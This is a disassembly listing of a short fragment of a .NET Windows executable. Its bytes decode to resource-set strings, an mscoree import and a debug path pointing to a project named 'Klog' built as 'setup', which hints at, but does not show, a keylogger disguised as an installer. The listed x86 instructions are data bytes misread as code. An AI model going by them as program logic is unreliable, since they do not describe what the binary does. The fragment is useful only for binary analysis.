  403670:	39 23                	cmp    %esp,(%ebx)
  403672:	53                   	push   %ebx
  403673:	79 73                	jns    0x4036e8
  403675:	74 65                	je     0x4036dc
  403677:	6d                   	insl   (%dx),%es:(%edi)
  403678:	2e 52                	cs push %edx
  40367a:	65 73 6f             	gs jae 0x4036ec
  40367d:	75 72                	jne    0x4036f1
  40367f:	63 65 73             	arpl   %esp,0x73(%ebp)
  403682:	2e 52                	cs push %edx
  403684:	75 6e                	jne    0x4036f4
  403686:	74 69                	je     0x4036f1
  403688:	6d                   	insl   (%dx),%es:(%edi)
  403689:	65 52                	gs push %edx
  40368b:	65 73 6f             	gs jae 0x4036fd
  40368e:	75 72                	jne    0x403702
  403690:	63 65 53             	arpl   %esp,0x53(%ebp)
  403693:	65 74 02             	gs je  0x403698
	...
  40369e:	00 00                	add    %al,(%eax)
  4036a0:	00 50 41             	add    %dl,0x41(%eax)
  4036a3:	44                   	inc    %esp
  4036a4:	50                   	push   %eax
  4036a5:	41                   	inc    %ecx
  4036a6:	44                   	inc    %esp
  4036a7:	50                   	push   %eax
  4036a8:	b4 00                	mov    $0x0,%ah
  4036aa:	00 00                	add    %al,(%eax)
  4036ac:	00 00                	add    %al,(%eax)
  4036ae:	00 00                	add    %al,(%eax)
  4036b0:	aa                   	stos   %al,%es:(%edi)
  4036b1:	53                   	push   %ebx
  4036b2:	00 e2                	add    %ah,%dl
  4036b4:	00 00                	add    %al,(%eax)
  4036b6:	00 00                	add    %al,(%eax)
  4036b8:	02 00                	add    (%eax),%al
  4036ba:	00 00                	add    %al,(%eax)
  4036bc:	54                   	push   %esp
  4036bd:	00 00                	add    %al,(%eax)
  4036bf:	00 e4                	add    %ah,%ah
  4036c1:	36 00 00             	add    %al,%ss:(%eax)
  4036c4:	e4 18                	in     $0x18,%al
	...
  4036d2:	00 00                	add    %al,(%eax)
  4036d4:	10 00                	adc    %al,(%eax)
	...
  4036e2:	00 00                	add    %al,(%eax)
  4036e4:	52                   	push   %edx
  4036e5:	53                   	push   %ebx
  4036e6:	44                   	inc    %esp
  4036e7:	53                   	push   %ebx
  4036e8:	90                   	nop
  4036e9:	3c 75                	cmp    $0x75,%al
  4036eb:	5d                   	pop    %ebp
  4036ec:	06                   	push   %es
  4036ed:	da f6                	(bad)
  4036ef:	41                   	inc    %ecx
  4036f0:	89 28                	mov    %ebp,(%eax)
  4036f2:	98                   	cwtl
  4036f3:	8d 40 c5             	lea    -0x3b(%eax),%eax
  4036f6:	9b da 01             	fiaddl (%ecx)
  4036f9:	00 00                	add    %al,(%eax)
  4036fb:	00 43 3a             	add    %al,0x3a(%ebx)
  4036fe:	5c                   	pop    %esp
  4036ff:	55                   	push   %ebp
  403700:	73 65                	jae    0x403767
  403702:	72 73                	jb     0x403777
  403704:	5c                   	pop    %esp
  403705:	6a 65                	push   $0x65
  403707:	6e                   	outsb  %ds:(%esi),(%dx)
  403708:	61                   	popa
  403709:	30 5c 73 6f          	xor    %bl,0x6f(%ebx,%esi,2)
  40370d:	75 72                	jne    0x403781
  40370f:	63 65 5c             	arpl   %esp,0x5c(%ebp)
  403712:	72 65                	jb     0x403779
  403714:	70 6f                	jo     0x403785
  403716:	73 5c                	jae    0x403774
  403718:	4b                   	dec    %ebx
  403719:	6c                   	insb   (%dx),%es:(%edi)
  40371a:	6f                   	outsl  %ds:(%esi),(%dx)
  40371b:	67 5c                	addr16 pop %esp
  40371d:	4b                   	dec    %ebx
  40371e:	6c                   	insb   (%dx),%es:(%edi)
  40371f:	6f                   	outsl  %ds:(%esi),(%dx)
  403720:	67 5c                	addr16 pop %esp
  403722:	6f                   	outsl  %ds:(%esi),(%dx)
  403723:	62 6a 5c             	bound  %ebp,0x5c(%edx)
  403726:	52                   	push   %edx
  403727:	65 6c                	gs insb (%dx),%es:(%edi)
  403729:	65 61                	gs popa
  40372b:	73 65                	jae    0x403792
  40372d:	5c                   	pop    %esp
  40372e:	73 65                	jae    0x403795
  403730:	74 75                	je     0x4037a7
  403732:	70 2e                	jo     0x403762
  403734:	70 64                	jo     0x40379a
  403736:	62 00                	bound  %eax,(%eax)
  403738:	60                   	pusha
  403739:	37                   	aaa
	...
  403742:	00 00                	add    %al,(%eax)
  403744:	7a 37                	jp     0x40377d
  403746:	00 00                	add    %al,(%eax)
  403748:	00 20                	add    %ah,(%eax)
	...
  40375e:	00 00                	add    %al,(%eax)
  403760:	6c                   	insb   (%dx),%es:(%edi)
  403761:	37                   	aaa
	...
  40376e:	5f                   	pop    %edi
  40376f:	43                   	inc    %ebx
  403770:	6f                   	outsl  %ds:(%esi),(%dx)
  403771:	72 45                	jb     0x4037b8
  403773:	78 65                	js     0x4037da
  403775:	4d                   	dec    %ebp
  403776:	61                   	popa
  403777:	69 6e 00 6d 73 63 6f 	imul   $0x6f63736d,0x0(%esi),%ebp
  40377e:	72 65                	jb     0x4037e5
  403780:	65 2e 64 6c          	gs cs fs insb (%dx),%es:(%edi)
  403784:	6c                   	insb   (%dx),%es:(%edi)
  403785:	00 00                	add    %al,(%eax)
  403787:	00 00                	add    %al,(%eax)
  403789:	00 ff                	add    %bh,%bh
  40378b:	25 00 20 40 00       	and    $0x402000,%eax
